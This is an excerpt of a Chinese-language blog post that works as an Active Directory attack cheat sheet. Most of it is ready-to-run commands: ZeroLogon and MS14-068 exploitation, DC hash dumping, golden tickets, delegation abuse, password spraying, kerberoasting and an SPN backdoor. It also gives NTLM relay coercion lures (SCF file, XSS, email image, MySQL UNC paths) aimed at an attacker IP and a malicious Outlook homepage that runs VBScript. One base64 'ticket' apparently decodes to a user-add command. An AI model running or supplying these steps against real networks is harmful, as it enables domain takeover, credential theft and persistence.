+<h4 id="keko利用"><a href="#keko利用" class="headerlink" title="keko利用"></a>keko利用</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exploit::ms14068 &#x2F;domain:exp.com &#x2F;user:cs &#x2F;password:Aa123123. &#x2F;ptt</span><br></pre></td></tr></table></figure>
+<h3 id="CVE-2020-1472"><a href="#CVE-2020-1472" class="headerlink" title="CVE-2020-1472"></a>CVE-2020-1472</h3><p>ZeroLogon通过置空DC机器用户的密码来打DC</p>
+<h4 id="python利用"><a href="#python利用" class="headerlink" title="python利用"></a>python利用</h4><p>置空DC机器用户密码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 cve-2020-1472-exploit.py WIN-I8E0L339L6E 10.0.2.254</span><br></pre></td></tr></table></figure>
+<p>读取DC的hash</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 secretsdump.py exp.com&#x2F;WIN-I8E0L339L6E\$@10.0.2.254 -just-dc -no-pass</span><br></pre></td></tr></table></figure>
+<p>PTH，PTK连</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmiexec.py exp&#x2F;administrator@10.0.2.254 -hashes :b660e61adc0aec1fe34711e6226fcc8c</span><br></pre></td></tr></table></figure>
+<h4 id="mimikatz利用"><a href="#mimikatz利用" class="headerlink" title="mimikatz利用"></a>mimikatz利用</h4><p>漏洞检测</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lsadump::zerologon &#x2F;target:WIN-I8E0L339L6E.exp.com &#x2F;account:DC$</span><br></pre></td></tr></table></figure>
+<p>置空</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lsadump::zerologon &#x2F;target:WIN-I8E0L339L6E.exp.com &#x2F;account:WIN-I8E0L339L6E$ &#x2F;exploit</span><br></pre></td></tr></table></figure>
+<p>查看票据</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;user:krbtgt &#x2F;domain:exp.com</span><br></pre></td></tr></table></figure>
+<p>生成黄金票据</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;domain:exp.com &#x2F;dc:WIN-I8E0L339L6E.exp.com &#x2F;user:krbtgt &#x2F;authuser:WIN-I8E0L339L6E$ &#x2F;authdomain:exp &#x2F;authpassword:   &#x2F;authntlm</span><br></pre></td></tr></table></figure>
+<p>impacket生成黄金票据</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">goldenPac.py test.local&#x2F;jack:123456!@#@WIN-I8E0L339L6E.exp.com</span><br></pre></td></tr></table></figure>
+<h4 id="Powershell利用"><a href="#Powershell利用" class="headerlink" title="Powershell利用"></a>Powershell利用</h4><p>Invoke-ZeroLogon.ps1</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">攻击</span><br><span class="line">Invoke-ZeroLogon DC.exp.com</span><br></pre></td></tr></table></figure>
+<h4 id="恢复域控密码"><a href="#恢复域控密码" class="headerlink" title="恢复域控密码"></a>恢复域控密码</h4><p>读取DC注册表</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg save HKLM\SYSTEM system.save</span><br><span class="line">reg save HKLM\SAM sam.save</span><br><span class="line">reg save HKLM\SECURITY security.save</span><br><span class="line">get system.save</span><br><span class="line">get sam.save</span><br><span class="line">get security.save</span><br><span class="line">del &#x2F;f system.save</span><br><span class="line">del &#x2F;f sam.save</span><br><span class="line">del &#x2F;f security.save</span><br></pre></td></tr></table></figure>
+<p>读原先机器用户HASH</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">secretsdump.py -sam sam.save -system system.save -security security.save LOCAL</span><br></pre></td></tr></table></figure>
+<p>还原HASH</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 reinstall_original_pw.py WIN-I8E0L339L6E 10.0.2.254 13adade6efd67a927131a3149a7693c4</span><br><span class="line">exp.com&#x2F;WIN-I8E0L339L6E\$@10.0.2.254 -just-dc -no-pass</span><br></pre></td></tr></table></figure>
+<h3 id="Kerberos-Bronze-Bit-Attack"><a href="#Kerberos-Bronze-Bit-Attack" class="headerlink" title="Kerberos Bronze Bit Attack"></a>Kerberos Bronze Bit Attack</h3><h4 id="约束委派绕过"><a href="#约束委派绕过" class="headerlink" title="约束委派绕过"></a>约束委派绕过</h4><p>这里思路是找到非约束委派主机S1，再利用账户向DC请求票据，最后拿着票据攻击S2</p>
+<p>1）找到配置了非约束的委派的账户和主机</p>
+<p>通过命令查找</p>
+<p>2）拿下权限<br>3）尝试Kerberos Bronze Bit Attack</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">runas &#x2F;user:PC\administrator mimikatz</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::ekeys</span><br></pre></td></tr></table></figure>
+<p>4）请求票据</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 getST.py -spn cifs&#x2F;Service2.test.local -impersonate administrator -hashes AAD3B435B51404EEAAD3B435B51404EE:aa09cecb1728cd5cad6e779c7f370563 -aesKey 71f9caf9203575bbbe760e6a669d90cbe39be0b5a442496295e2f63990ee858f exp.com&#x2F;PC -force-forwardable</span><br></pre></td></tr></table></figure>
+<p>5）PTT攻击</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export KRB5CCNAME&#x3D;xx.krb</span><br><span class="line">psexec.py exp.com&#x2F;cs@dc.exp.com -k -no-pass PC.exp.com</span><br></pre></td></tr></table></figure>
+<h4 id="资源约束委派绕过"><a href="#资源约束委派绕过" class="headerlink" title="资源约束委派绕过"></a>资源约束委派绕过</h4><p>这里思路是先拿下一个S1，然后利用特权新建一个机器账户，再利用Microsoft.ActiveDirectory.Management.dll添加机器用户与S2的信任关系，再模拟机器用户向DC申请票据，最后通过票据登录S2。</p>
+<p>1）首先需要通过powermad新加入一个计算机账户AttackerService，密码为AttackerServicePassword，用域账户jack登录service1。</p>
+<p>注：这个powermad工具不仅可以通过滥用特权添加机器账户，还可以添加NS解析记录。NS解析记录可用于HTTP的NTLM RELAY。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\Powermad\powermad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount AttackerService -Password $(ConvertTo-SecureString &#39;AttackerServicePassword&#39; -AsPlainText -Force)</span><br></pre></td></tr></table></figure>
+<p>2）然后使用PowerShell Active Directory模块添加基于资源的约束委派，即从AttackerService到Service2的传入信任关系。<br>Microsoft.ActiveDirectory.Management.dll在安装powershell模块Active Directory后生成，默认只在域控上有，可以从域控上导出。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\Microsoft.ActiveDirectory.Management.dll</span><br><span class="line">Get-ADComputer AttackerService #确认机器账户已经被添加</span><br><span class="line">Set-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$</span><br><span class="line">Get-ADComputer Service2 -Properties PrincipalsAllowedToDelegateToAccount</span><br></pre></td></tr></table></figure>
+<p>3）设置好基于资源的约束委派之后就可以模拟用户申请票据了。</p>
+<p>hashes和aesKey参数来自于添加的机器用户AttackerService，mimikatz可以计算</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::hash &#x2F;password:AttackerServicePassword &#x2F;user:AttackerService</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 getST.py -spn cifs&#x2F;Service2.test.local -impersonate administrator -hashes 830f8df592f48bc036ac79a2bb8036c5:830f8df592f48bc036ac79a2bb8036c5 -aesKey 2a62271bdc6226c1106c1ed8dcb554cbf46fb99dda304c472569218c125d9ffc test.local&#x2F;AttackerService -force-forwardable</span><br></pre></td></tr></table></figure>
+<p>4）PTT攻击</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export KRB5CCNAME&#x3D;xx.krb</span><br><span class="line">psexec.py exp.com&#x2F;cs@dc.exp.com -k -no-pass PC.exp.com</span><br></pre></td></tr></table></figure>
+<h3 id="MS16-075"><a href="#MS16-075" class="headerlink" title="MS16-075"></a>MS16-075</h3><p>potato系列，通过http协议relay，再反射回给本机的smb协议。用作提权</p>
+<h3 id="CVE-2018-8581"><a href="#CVE-2018-8581" class="headerlink" title="CVE-2018-8581"></a>CVE-2018-8581</h3><p>exchange ssrf漏洞</p>
+<p>1）使用impacket监听端口进行等待连接</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ntlmrelayx.py -t ldap:&#x2F;&#x2F;10.0.2.254 --no-dump -no-da -escalate-user cs</span><br></pre></td></tr></table></figure>
+<p>2）发起推送订阅指定所需的URL，Exchange 服务器将尝试向这个URL发送通知</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privexchange.py -ah 10.0.2.4 owa2010sp3.exp.com -u sqladmin -p 123456 -d exp -ev 2010_SP1</span><br></pre></td></tr></table></figure>
+<p>3）relay到域控的ldap服务器会自动给普通用户添加两台ACL</p>
+<p>4）dcync</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">secretdump.py exp.com&#x2F;cs:123456@OWA2010SP3.exp.com -dc-ip 10.0.2.253 -just-dc-user administrator</span><br></pre></td></tr></table></figure>
+<h3 id="CVE-2019-1040"><a href="#CVE-2019-1040" class="headerlink" title="CVE-2019-1040"></a>CVE-2019-1040</h3><p>smb需要签名的MIC防护绕过</p>
+<h4 id="域控打法"><a href="#域控打法" class="headerlink" title="域控打法"></a>域控打法</h4><p>1）域控打法<br>使用impacket监听445进行等待域控进行连接</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ntlmrelayx.py -t ldap:&#x2F;&#x2F;1.1.1.1 --escalate-user win7\$ --remove-mic --no-dump -smb2support</span><br></pre></td></tr></table></figure>
+<p>使用打印机漏洞让域控连接我们的445(注意攻击的域控跟回连的LDAP所在的服务器不要在同一台域控)</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">printerbug.py exp.com&#x2F;cs:123456@10.0.2.4 10.0.2.5</span><br></pre></td></tr></table></figure>
+<p>发起win7$到dc2012的s4u，通过-impersonate参数模拟用户administrator的票证</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getST.py exp.com&#x2F;win7\$ -dc-ip 10.0.2.254 -spn cifs&#x2F;dc2012r2.exp.com -hashes xxxx</span><br><span class="line">-impersonate administrator</span><br></pre></td></tr></table></figure>
+<p>使用administrator用户的票据登录域控psexec，导入凭证</p>
+<p>2）exchange打法</p>
+<p>暂无</p>
+<h3 id="CVE-2019-1384"><a href="#CVE-2019-1384" class="headerlink" title="CVE-2019-1384"></a>CVE-2019-1384</h3><p>这个是绕过MS08-068，通过超时发送type3</p>
+<p><a href="https://shenaniganslabs.io/files/impacket-ghostpotato.zip">https://shenaniganslabs.io/files/impacket-ghostpotato.zip</a></p>
+<h2 id="协议缺陷利用"><a href="#协议缺陷利用" class="headerlink" title="协议缺陷利用"></a>协议缺陷利用</h2><h3 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h3><p>使用DomainPasswordSpray.ps1</p>
+<p><a href="https://github.com/dafthack/DomainPasswordSpray">https://github.com/dafthack/DomainPasswordSpray</a></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell.exe <span class="literal">-exec</span> bypass <span class="built_in">Import-Module</span> DomainPasswordSpray.ps1</span><br><span class="line"><span class="comment">#枚举用户输出成txt</span></span><br><span class="line"><span class="built_in">Get-DomainUserList</span> | <span class="built_in">Out-File</span> <span class="literal">-Encoding</span> ascii userlist.txt</span><br><span class="line"><span class="comment">#喷洒</span></span><br><span class="line"><span class="built_in">Invoke-DomainPasswordSpray</span> <span class="literal">-UserList</span> users.txt <span class="literal">-Domain</span> exp.com <span class="literal">-PasswordList</span> passlist.txt <span class="literal">-OutFile</span> sprayed<span class="literal">-creds</span>.txt</span><br></pre></td></tr></table></figure>
+<h3 id="AS-REPRoasting"><a href="#AS-REPRoasting" class="headerlink" title="AS-REPRoasting"></a>AS-REPRoasting</h3><p>如果存在设置了选项不需要kerberos预身份验证的用户，可以直接攻击</p>
+<p>查找具有此属性的用户</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1</span><br><span class="line">Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose</span><br></pre></td></tr></table></figure>
+<p>发包且监听</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rubeus.exe asreproast</span><br><span class="line">对于要打非域内的机器通过指定dc的参数即可</span><br><span class="line">Rubeus.exe asreproast &#x2F;dc:xxx</span><br></pre></td></tr></table></figure>
+<h3 id="GPP利用"><a href="#GPP利用" class="headerlink" title="GPP利用"></a>GPP利用</h3><p>读取组策略文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dir &#x2F;s &#x2F;a \\DC.exp.com\SYSVOL\exp.com\*.xml</span><br><span class="line">powershell  import-modulo  .\Get-GPPpassword.ps1;Get-GppPassword</span><br></pre></td></tr></table></figure>
+<h3 id="kerberoasting"><a href="#kerberoasting" class="headerlink" title="kerberoasting"></a>kerberoasting</h3><p>其原理在于先用LDAP查询于域的spn，再通过发送TGS包，提取拼接得到hashcat或者john能爆破的格式。</p>
+<p>rubeus攻击直接一键化了。</p>
+<p>发包并监听</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rubeus.exe kerberoast</span><br></pre></td></tr></table></figure>
+<p>kirbi票据破解</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python tgsrepcrack.py mima.txt 123.kirbi</span><br></pre></td></tr></table></figure>
+<p>留后门</p>
+<p>给管理员注册一个UNC的服务留后门，随时可以拿读管理员kirbi</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setspn -U -A UNC&#x2F;dc.exp.com administrator</span><br></pre></td></tr></table></figure>
+<h3 id="约束委派攻击"><a href="#约束委派攻击" class="headerlink" title="约束委派攻击"></a>约束委派攻击</h3><p>在adsiedit.msc可以打开ADSI编辑器链接LDAP</p>
+<h4 id="非约束委派攻击"><a href="#非约束委派攻击" class="headerlink" title="非约束委派攻击"></a>非约束委派攻击</h4><p>1.找到配置了非约束的委派的机器账户（使用命令）<br>2.拿下权限<br>3.监听来自DC的访问</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rubeus.exe monitor &#x2F;interval:1 &#x2F;filteruser:dc$</span><br></pre></td></tr></table></figure>
+<p>4.得到域控的票据<br>a.打印机漏洞<br>b.其他UNC方式，需要域管交互<br>5.导入base64的ticket</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\Rubeus.exe ptt &#x2F;ticket:base64</span><br></pre></td></tr></table></figure>
+<p>mimikatz导出票据</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::tickets &#x2F;export</span><br></pre></td></tr></table></figure>
+<p>还可通过powershell写成票据文件，可以用rubeus直接导出</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[IO.File]::WriteAllBytes(&quot;ticket.kirbi&quot;, [Convert]::FromBase64String(&quot;Y21kIC9jIG5ldCB1c2VyIGJ5cGFzc3VhYyAxMjM0NTYgL2FkZA&#x3D;&#x3D;&quot;))</span><br></pre></td></tr></table></figure>
+<p>PTT</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::ptt 1.kirbi</span><br><span class="line">lsadump::dcsync &#x2F;domain:test.local &#x2F;all &#x2F;csv</span><br></pre></td></tr></table></figure>
+<h4 id="约束委派攻击-1"><a href="#约束委派攻击-1" class="headerlink" title="约束委派攻击"></a>约束委派攻击</h4><p>DC上配置委派用户，用来处理其他用户对DC上特定服务的访问请求</p>
+<p>DC上配置委派主机，用来处理其他用户对DC上特定服务的访问请求</p>
+<p>1.找到配置了非约束的委派的账户和主机</p>
+<p>2.拿下权限</p>
+<p>3.基于委派服务用户向服务器请求TGT</p>
+<p>使用keko冒充委派服务用户请求TGT，密码明文，hash，aes加密都行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tgt::ask &#x2F;user:cs &#x2F;domain:exp.com &#x2F;password:password</span><br><span class="line">tgt::ask &#x2F;user:cs &#x2F;domain:exp.com &#x2F;NTLM:b4f27a13d0f78d5ad83750095ef2d8ec</span><br></pre></td></tr></table></figure>
+<p>4.通过s4u伪造<a href="mailto:&#x61;&#100;&#x6d;&#x69;&#x6e;&#x69;&#x73;&#116;&#x72;&#97;&#116;&#x6f;&#114;&#64;&#x65;&#x78;&#x70;&#x2e;&#99;&#111;&#109;&#x69;&#x66;&#x73;">&#x61;&#100;&#x6d;&#x69;&#x6e;&#x69;&#x73;&#116;&#x72;&#97;&#116;&#x6f;&#114;&#64;&#x65;&#x78;&#x70;&#x2e;&#99;&#111;&#109;&#x69;&#x66;&#x73;</a>服务</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tgs::s4u &#x2F;tgt:1.kirbi &#x2F;user:administrator &#x2F;service:cifs&#x2F;dc.test.local</span><br></pre></td></tr></table></figure>
+<p>S4U2Self获取到的ST1以及S4U2Proxy获取到的dm08 CIFS服务的ST2会保存在当前目录下</p>
+<p>5.PTT</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::ptt administrator@cifs.kirbi</span><br></pre></td></tr></table></figure>
+<h4 id="资源约束委派攻击"><a href="#资源约束委派攻击" class="headerlink" title="资源约束委派攻击"></a>资源约束委派攻击</h4><p>适用2012 R2和Windows Server 2012及以上</p>
+<p>暂无</p>
+<h3 id="NTML-RELAY攻击"><a href="#NTML-RELAY攻击" class="headerlink" title="NTML RELAY攻击"></a>NTML RELAY攻击</h3><p>NTLM协议是加载在smb、http、ldap等协议上的，relay攻击的过程就是中间人攻击的过程。主要用于域内攻击。</p>
+<p>v1版本的NET NTLM拿到相当于拿到hash，使用<a href="https://crack.sh/get-cracking/">这里</a>破解NET NTLMv1不需要RELAY，不过v1版本在win7/server2008之后就不适用了，之后的版本都是v2，v2的攻击方式主要是relay。</p>
+<p>v2的破解使用hashcat</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat -m 5600  win10::TEST:1122334455667788:622DED0816CFF5A0652209F20A7CF17A:0101000000000000C0653150DE09D201532C07A7DEE654B8000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D2010600040002000000080030003000000000000000010000000020000067840C88904F15E659858A3CBA35EBEF61A38EC88C5E3D26B968F1C20C9ACAC10A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E003100300030002E0031000000000000000000 &#x2F;tmp&#x2F;password.dic --force</span><br></pre></td></tr></table></figure>
+<p>以下分三种不同协议的利用方式进行说明。</p>
+<p>responder工具发起监听<a href="https://github.com/lgandx/Responder%EF%BC%8C%E4%BD%86%E4%B8%8D%E8%83%BD%E4%B8%AD%E7%BB%A7">https://github.com/lgandx/Responder，但不能中继</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">responder -I eth0</span><br></pre></td></tr></table></figure>
+<p>impacket下的ntlmrelayx和ldaprelax都可以中继。</p>
+<p>接收smb，中继到smb</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ntlmrelayx.py -t smb:&#x2F;&#x2F;10.0.2.5 -c whoami -smb2support</span><br></pre></td></tr></table></figure>
+<p>接收smb，中继到ldap</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ntlmrelayx.py -t ldap:&#x2F;&#x2F;10.0.2.5 -c whoami -smb2support</span><br></pre></td></tr></table></figure>
+<h4 id="RELAY2SMB"><a href="#RELAY2SMB" class="headerlink" title="RELAY2SMB"></a>RELAY2SMB</h4><h5 id="桌面"><a href="#桌面" class="headerlink" title="桌面"></a>桌面</h5><p>修改桌面的desktop.ini的IconResource路径为UNC路径，当在域控上打开桌面文件夹时可成功攻击</p>
+<h5 id="SCF文件"><a href="#SCF文件" class="headerlink" title="SCF文件"></a>SCF文件</h5><p>新建scf文件，放到文件夹下，诱导访问这个文件夹</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Shell]</span><br><span class="line">Command&#x3D;2</span><br><span class="line">IconFile&#x3D;\\10.0.2.4\scf\test.ico</span><br><span class="line">[Taskbar]</span><br><span class="line">Command&#x3D;ToggleDesktop</span><br></pre></td></tr></table></figure>
+<h5 id="用户头像"><a href="#用户头像" class="headerlink" title="用户头像"></a>用户头像</h5><p>win10的情况下，修改用户的头像为UNC地址</p>
+<h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><p>以下是可以携带UNC的命令。都可以命令执行了，还需要relay吗？</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; net.exe use \hostshare </span><br><span class="line">&gt; attrib.exe \hostshare  </span><br><span class="line">&gt; bcdboot.exe \hostshare  </span><br><span class="line">&gt; bdeunlock.exe \hostshare  </span><br><span class="line">&gt; cacls.exe \hostshare  </span><br><span class="line">&gt; certreq.exe \hostshare #(noisy, pops an error dialog) </span><br><span class="line">&gt; certutil.exe \hostshare  </span><br><span class="line">&gt; cipher.exe \hostshare  </span><br><span class="line">&gt; ClipUp.exe -l \hostshare  </span><br><span class="line">&gt; cmdl32.exe \hostshare  </span><br><span class="line">&gt; cmstp.exe &#x2F;s \hostshare  </span><br><span class="line">&gt; colorcpl.exe \hostshare #(noisy, pops an error dialog)  </span><br><span class="line">&gt; comp.exe &#x2F;N&#x3D;0 \hostshare \hostshare  </span><br><span class="line">&gt; compact.exe \hostshare  </span><br><span class="line">&gt; control.exe \hostshare  </span><br><span class="line">&gt; convertvhd.exe -source \hostshare -destination \hostshare </span><br><span class="line">&gt; Defrag.exe \hostshare  </span><br><span class="line">&gt; diskperf.exe \hostshare  </span><br><span class="line">&gt; dispdiag.exe -out \hostshare  </span><br><span class="line">&gt; doskey.exe &#x2F;MACROFILE&#x3D;\hostshare  </span><br><span class="line">&gt; esentutl.exe &#x2F;k \hostshare  </span><br><span class="line">&gt; expand.exe \hostshare  </span><br><span class="line">&gt; extrac32.exe \hostshare  </span><br><span class="line">&gt; FileHistory.exe \hostshare #(noisy, pops a gui)  </span><br><span class="line">&gt; findstr.exe * \hostshare  </span><br><span class="line">&gt; fontview.exe \hostshare #(noisy, pops an error dialog)  </span><br><span class="line">&gt; fvenotify.exe \hostshare #(noisy, pops an access denied error)  </span><br><span class="line">&gt; FXSCOVER.exe \hostshare #(noisy, pops GUI)  </span><br><span class="line">&gt; hwrcomp.exe -check \hostshare  </span><br><span class="line">&gt; hwrreg.exe \hostshare  </span><br><span class="line">&gt; icacls.exe \hostshare   </span><br><span class="line">&gt; licensingdiag.exe -cab \hostshare  </span><br><span class="line">&gt; lodctr.exe \hostshare  </span><br><span class="line">&gt; lpksetup.exe &#x2F;p \hostshare &#x2F;s  </span><br><span class="line">&gt; makecab.exe \hostshare  </span><br><span class="line">&gt; msiexec.exe &#x2F;update \hostshare &#x2F;quiet  </span><br><span class="line">&gt; msinfo32.exe \hostshare #(noisy, pops a &quot;cannot open&quot; dialog)  </span><br><span class="line">&gt; mspaint.exe \hostshare #(noisy, invalid path to png error) </span><br><span class="line">&gt; msra.exe &#x2F;openfile \hostshare #(noisy, error)  </span><br><span class="line">&gt; mstsc.exe \hostshare #(noisy, error)  </span><br><span class="line">&gt; netcfg.exe -l \hostshare -c p -i foo</span><br></pre></td></tr></table></figure>
+<h5 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h5><p>适用于IE和EDGE，还可以结合NBNS投毒利用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;\\172.16.100.1\xss&quot;&gt;</span><br></pre></td></tr></table></figure>
+<h5 id="邮件"><a href="#邮件" class="headerlink" title="邮件"></a>邮件</h5><p>同XSS</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;\\172.16.100.1\outlook&quot;&gt;</span><br></pre></td></tr></table></figure>
+<h5 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h5><p>需要具备load_file权限，且没有secure_file_priv的限制(5.5.53默认是空，之后的话默认为NULL就不好利用了,不排除一些管理员会改)</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select load_file(&#39;\\\\172.16.100.1\\mysql&#39;);</span><br></pre></td></tr></table></figure>
+<h5 id="NBNS和LLMNR"><a href="#NBNS和LLMNR" class="headerlink" title="NBNS和LLMNR"></a>NBNS和LLMNR</h5><p>滥用MachineAccountQuota属性，添加NS解析条目</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Invoke-DNSUpdate -DNSType A -DNSName kali -DNSData 10.0.2.4</span><br></pre></td></tr></table></figure>
+<h5 id="XXE-amp-SSRF"><a href="#XXE-amp-SSRF" class="headerlink" title="XXE&amp;SSRF"></a>XXE&amp;SSRF</h5><p>SSRF使用file协议，XXE xml文件使用UNC路径或http协议。</p>
+<p>配合NBNS可以直接利用http协议</p>
+<h5 id="打印机漏洞"><a href="#打印机漏洞" class="headerlink" title="打印机漏洞"></a>打印机漏洞</h5><p>本地测试printerbug.py的时候，发现开了Print Spooler服务不行，还需要设置一个共享的打印机。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python printerbug.py exp.com&#x2F;cs@10.0.2.5 10.0.2.4</span><br><span class="line">SpoolSample.exe 目标 回连</span><br></pre></td></tr></table></figure>
+<h4 id="RELAY2EWS"><a href="#RELAY2EWS" class="headerlink" title="RELAY2EWS"></a>RELAY2EWS</h4><p><a href="https://github.com/Arno0x/NtlmRelayToEWS">https://github.com/Arno0x/NtlmRelayToEWS</a></p>
+<p>homepage</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Language&quot; content&#x3D;&quot;en-us&quot;&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;windows-1252&quot;&gt;</span><br><span class="line">&lt;title&gt;Outlook&lt;&#x2F;title&gt;</span><br><span class="line">&lt;script id&#x3D;clientEventHandlersVBS language&#x3D;vbscript&gt;</span><br><span class="line">&lt;!--</span><br><span class="line"> Sub window_onload()</span><br><span class="line">     Set Application &#x3D; ViewCtl1.OutlookApplication</span><br><span class="line">     Set cmd &#x3D; Application.CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">     cmd.Run(&quot;calc&quot;)</span><br><span class="line"> End Sub</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"> &lt;object classid&#x3D;&quot;clsid:0006F063-0000-0000-C000-000000000046&quot; id&#x3D;&quot;ViewCtl1&quot; data&#x3D;&quot;&quot; width&#x3D;&quot;100%&quot; height&#x3D;&quot;100%&quot;&gt;&lt;&#x2F;object&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="RELAY2LDAP"><a href="#RELAY2LDAP" class="headerlink" title="RELAY2LDAP"></a>RELAY2LDAP</h4><p>高权限用户<br>如果NTLM发起用户在以下用户组</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Enterprise admins</span><br><span class="line">Domain admins</span><br><span class="line">Built-in Administrators</span><br><span class="line">Backup operators</span><br><span class="line">Account operators</span><br></pre></td></tr></table></figure>
+<p>那么就可以将任意用户拉进该组，从而使该用户称为高权限用户，比如域管</p>
+<p>CVE-2019-1040</p>
+<h3 id="ACL利用"><a href="#ACL利用" class="headerlink" title="ACL利用"></a>ACL利用</h3><p>这类暂时还不太能理解，怎么组织命令查询有这些权限的呢？</p>
+<p>个人感觉这个ACL利用只是对协议利用的原理进行了描述。</p>
+<h4 id="member"><a href="#member" class="headerlink" title="member"></a>member</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bf9679c0-0de6-11d0-a285-00aa003049e2</span><br></pre></td></tr></table></figure>
+<p>可以将任意用户，组或计算机添加到目标组<br>将任意用户加入domain admins组</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adfind -users -rb CN&#x3D;cs -dsq|admod -users -rb CN&#x3D;&quot;Domain Admins&quot; -stdinadd member</span><br></pre></td></tr></table></figure>
+<h4 id="servicePrincipalName"><a href="#servicePrincipalName" class="headerlink" title="servicePrincipalName"></a>servicePrincipalName</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">28630EBB-41D5-11D1-A9C1-0000F80367C1</span><br></pre></td></tr></table></figure>
+<p>如果对一个对象有写入spn的权限，那么就可以对这个对象进行kerberosting了，如果密码强度不强的话，有机会获取到密码。</p>
+<h4 id="GPC-File-Sys-Path"><a href="#GPC-File-Sys-Path" class="headerlink" title="GPC-File-Sys-Path"></a>GPC-File-Sys-Path</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f30e3bc1-9ff0-11d1-b603-0000f80367c1</span><br></pre></td></tr></table></figure>
